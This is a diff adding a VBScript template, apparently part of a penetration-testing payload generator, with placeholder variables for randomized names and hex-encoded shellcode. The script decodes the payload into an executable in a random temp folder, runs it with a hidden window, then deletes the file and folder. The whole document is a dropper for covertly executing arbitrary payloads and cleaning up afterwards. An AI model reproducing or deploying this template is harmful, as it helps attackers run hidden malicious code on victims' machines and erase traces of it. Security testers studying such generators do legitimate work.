@@ -1,0 +1,26 @@
+Function %{var_func}()
+	%{var_shellcode} = "%{hex_shellcode}"
+
+	Dim %{var_obj}
+	Set %{var_obj} = CreateObject("Scripting.FileSystemObject")
+	Dim %{var_stream}
+	Dim %{var_tempdir}
+	Dim %{var_tempexe}
+	Dim %{var_basedir}
+	Set %{var_tempdir} = %{var_obj}.GetSpecialFolder(2)
+	%{var_basedir} = %{var_tempdir} & "\" & %{var_obj}.GetTempName()
+	%{var_obj}.CreateFolder(%{var_basedir})
+	%{var_tempexe} = %{var_basedir} & "\" & "%{exe_filename}"
+	Set %{var_stream} = %{var_obj}.CreateTextFile(%{var_tempexe}, true , false)
+	For i = 1 to Len(%{var_shellcode}) Step 2
+	    %{var_stream}.Write Chr(CLng("&H" & Mid(%{var_shellcode},i,2)))
+	Next
+	%{var_stream}.Close
+	Dim %{var_shell}
+	Set %{var_shell} = CreateObject("Wscript.Shell")
+	%{var_shell}.run %{var_tempexe}, 0, true
+	%{var_obj}.DeleteFile(%{var_tempexe})
+	%{var_obj}.DeleteFolder(%{var_basedir})
+End Function
+
+%{init}
